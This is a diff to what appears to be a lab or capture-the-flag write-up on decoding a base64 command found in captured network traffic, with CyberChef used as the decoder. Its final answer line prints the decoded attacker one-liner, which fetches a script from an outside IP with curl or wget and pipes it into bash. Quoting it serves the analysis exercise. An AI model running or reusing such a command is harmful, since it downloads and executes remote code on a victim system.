@@ -718,8 +718,6 @@ We need to decode the command we found in the packet. We know it is base 64 enco
 
 Then we can use [CyberChef](https://gchq.github.io/CyberChef) to decode it from base64:
 
-https://gchq.github.io/CyberChef/#input=aHR0cHM6Ly90cnloYWNrbWUuY29tL3IvY2FyZWVycw&oenc=65001
-
 Finally we get the answer:
 
 Answer:```(curl -s 45.155.205.233:5874/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80)|bash```
